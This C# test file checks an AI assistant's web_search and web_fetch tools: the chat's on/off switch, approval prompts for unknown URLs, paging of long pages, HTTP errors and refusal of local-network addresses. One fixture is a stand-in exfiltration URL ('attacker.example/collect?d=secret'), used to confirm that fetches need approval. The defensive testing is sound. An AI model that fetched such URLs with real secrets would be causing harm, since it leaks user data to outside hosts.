using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using enki.Models;
using enki.Services;
using Xunit;

namespace enki.Tests.Services;

/// <summary><c>web_search</c> y <c>web_fetch</c> sobre el catálogo real: interruptor del chat, independencia del
/// permiso de consulta del vault, confirmación de direcciones desconocidas, tramos y errores.</summary>
public sealed class AiVaultToolboxWebTests : IDisposable
{
    private readonly string _directory = Path.Combine(Path.GetTempPath(), "enki-tests-" + Guid.NewGuid().ToString("N"));
    private readonly SettingsService _settings;
    private readonly AiWebService _web;
    private readonly AiVaultToolbox _tools;
    private readonly List<Uri> _requested = [];
    private Func<HttpRequestMessage, HttpResponseMessage> _respond;

    public AiVaultToolboxWebTests()
    {
        _settings = new SettingsService(_directory);
        var vault = new VaultService(_settings);
        vault.InitializeVault(Path.Combine(_directory, "vault"), seedWelcomeNote: false);
        _respond = request => request.RequestUri!.Host == "html.duckduckgo.com"
            ? Html(AiWebServiceTests.DuckDuckGoPage)
            : Html($"<html><head><title>Página {request.RequestUri.AbsolutePath}</title></head><body><main><p>{new string('x', 300)}</p>"
                + "<p><a href=\"/siguiente\">Siguiente</a></p></main></body></html>");
        _web = new AiWebService(_settings, new AiApiKeyStore(new TestPolarCredentialStore(), AiApiKeyKind.BraveSearch),
            new AiWebServiceTests.Handler(request =>
            {
                _requested.Add(request.RequestUri!);
                return _respond(request);
            }));
        _tools = new AiVaultToolbox(vault, new SessionService(vault), new KanbanService(_directory), new PolarTaskService(_directory),
            new PolarAuthService(_settings, baseUrl: "https://test.example", anonKey: "test"), new ReminderService(_directory), _settings,
            webService: _web);
    }

    public void Dispose()
    {
        _web.Dispose();
        if (Directory.Exists(_directory)) Directory.Delete(_directory, true);
    }

    private static HttpResponseMessage Html(string html, HttpStatusCode status = HttpStatusCode.OK) =>
        new(status) { Content = new StringContent(html, Encoding.UTF8, "text/html") };

    /// <summary>Un chat con la web encendida y <b>sin</b> permiso de consulta del vault (que se deniega si se pide).</summary>
    private static AiToolContext Context(bool web = true, Func<AiApprovalRequest, bool>? approve = null, AiAccessScope? scope = null) => new()
    {
        Scope = scope ?? AiAccessScope.Vault,
        WebAccess = () => web,
        ReadAccess = new AiReadAccess(() => false, _ => Task.FromResult(false)),
        ApprovalRequested = approve is null ? null : (request, _) => Task.FromResult(approve(request))
    };

    private Task<AiToolOutcome> Call(string name, object args, AiToolContext context) =>
        _tools.ExecuteAsync(name, JsonSerializer.SerializeToElement(args), context);

    private static JsonElement Json(AiToolOutcome result)
    {
        Assert.False(result.IsError, result.Text);
        return JsonSerializer.Deserialize<JsonElement>(result.Text);
    }

    [Fact]
    public void WebTools_AreOfferedOnlyWithTheChatSwitchOn_InAnyScope()
    {
        Assert.DoesNotContain(_tools.AvailableTools(Context(web: false)), t => t.Scope == AiToolScope.Web);
        Assert.Equal(["web_fetch", "web_search"],
            _tools.AvailableTools(Context(scope: new AiAccessScope("session", false))).Where(t => t.Scope == AiToolScope.Web).Select(t => t.Name).Order());
    }

    [Fact]
    public async Task Search_NeedsNoVaultReadPermission_AndItsResultsOpenWithoutAsking()
    {
        var activities = new List<AiToolActivity>();
        var asked = 0;
        var context = new AiToolContext
        {
            Scope = AiAccessScope.Vault,
            WebAccess = () => true,
            ReadAccess = new AiReadAccess(() => false, _ => Task.FromResult(false)),
            ActivityReported = activities.Add,
            ApprovalRequested = (_, _) => { asked++; return Task.FromResult(false); }
        };

        var search = Json(await Call("web_search", new { query = "enki docs" }, context));
        Assert.Equal("DuckDuckGo", search.GetProperty("engine").GetString());
        var url = search.GetProperty("results")[0].GetProperty("url").GetString()!;

        var page = Json(await Call("web_fetch", new { url }, context));
        Assert.Equal(0, asked);
        Assert.Equal("Página /docs", page.GetProperty("title").GetString());

        // Un enlace de la página leída también se puede seguir sin preguntar.
        Json(await Call("web_fetch", new { url = "https://example.org/siguiente" }, context));
        Assert.Equal(0, asked);

        var fetched = activities.Last(a => a.Tool == "web_fetch");
        Assert.Equal(AiToolTargetKind.WebPage, fetched.TargetKind);
        Assert.Equal("https://example.org/siguiente", fetched.TargetId);
        Assert.Equal(AiToolActivityState.Succeeded, fetched.State);
        Assert.Equal(AiToolTargetKind.WebSearch, activities.First(a => a.Tool == "web_search").TargetKind);
    }

    [Fact]
    public async Task Fetch_OfAnUnknownAddress_AsksFirst_AndDoesNotDownloadIfDenied()
    {
        AiApprovalRequest? request = null;
        var denied = await Call("web_fetch", new { url = "https://attacker.example/collect?d=secret" },
            Context(approve: r => { request = r; return false; }));

        Assert.True(denied.IsError);
        Assert.Contains("did not allow", denied.Text, StringComparison.Ordinal);
        Assert.Empty(_requested);
        Assert.Equal(["https://attacker.example/collect?d=secret"], request!.Items);
        Assert.NotNull(request.Hint);

        var allowed = Json(await Call("web_fetch", new { url = "https://attacker.example/collect?d=secret" }, Context(approve: _ => true)));
        Assert.Equal("https://attacker.example/collect?d=secret", allowed.GetProperty("url").GetString());

        var context = Context();
        context.KnownWebUrls.AddFrom("Lee https://user.example/articulo por favor");
        Json(await Call("web_fetch", new { url = "https://user.example/articulo" }, context));
    }

    [Fact]
    public async Task TurningWebAccessOffMidTurn_RefusesTheNextCall()
    {
        var on = true;
        var context = new AiToolContext { Scope = AiAccessScope.Vault, WebAccess = () => on };
        Json(await Call("web_search", new { query = "uno" }, context));
        on = false;
        var refused = await Call("web_search", new { query = "dos" }, context);
        Assert.True(refused.IsError);
        Assert.Contains("turned off web access", refused.Text, StringComparison.Ordinal);
        Assert.Single(_requested);
    }

    [Fact]
    public async Task Fetch_ReturnsLongPagesInParts()
    {
        var paragraphs = string.Concat(Enumerable.Range(0, 60).Select(i => $"<p>Párrafo {i} {new string('z', 80)}</p>"));
        _respond = _ => Html($"<html><head><title>Larga</title></head><body><article>{paragraphs}</article></body></html>");
        var context = Context();
        context.KnownWebUrls.Add("https://long.example/");

        var first = Json(await Call("web_fetch", new { url = "https://long.example/", max_chars = 1000 }, context));
        var next = first.GetProperty("next_start").GetInt32();
        Assert.InRange(next, 800, 1000);
        Assert.EndsWith("\n", first.GetProperty("text").GetString());

        var second = Json(await Call("web_fetch", new { url = "https://long.example/", start = next, max_chars = 1000 }, context));
        Assert.Equal(next, second.GetProperty("start").GetInt32());
        Assert.Single(_requested);

        var total = first.GetProperty("total_chars").GetInt32();
        Assert.True((await Call("web_fetch", new { url = "https://long.example/", start = total }, context)).IsError);
    }

    [Fact]
    public async Task Failures_ReachTheModelAndTheUserWithTheirOwnReason()
    {
        _respond = _ => Html("no", HttpStatusCode.NotFound);
        var activities = new List<AiToolActivity>();
        var context = new AiToolContext { Scope = AiAccessScope.Vault, WebAccess = () => true, ActivityReported = activities.Add };
        context.KnownWebUrls.Add("https://gone.example/page");

        var result = await Call("web_fetch", new { url = "https://gone.example/page" }, context);

        Assert.True(result.IsError);
        Assert.Contains("HTTP 404", result.Text, StringComparison.Ordinal);
        var activity = activities.Last();
        Assert.Equal(AiToolActivityState.Failed, activity.State);
        Assert.Contains("404", activity.Error, StringComparison.Ordinal);

        var local = await Call("web_fetch", new { url = "http://192.168.0.10/router" }, context);
        Assert.True(local.IsError);
        Assert.Contains("local network", local.Text, StringComparison.Ordinal);
    }

    [Fact]
    public void PageEnd_CutsAtALineBreakNearTheEnd()
    {
        var text = new string('a', 900) + "\n" + new string('b', 500);
        Assert.Equal(901, AiVaultToolbox.PageEnd(text, 0, 1000));
        Assert.Equal(text.Length, AiVaultToolbox.PageEnd(text, 901, 1000));
        Assert.Equal(1000, AiVaultToolbox.PageEnd(new string('c', 2000), 0, 1000));
    }
}
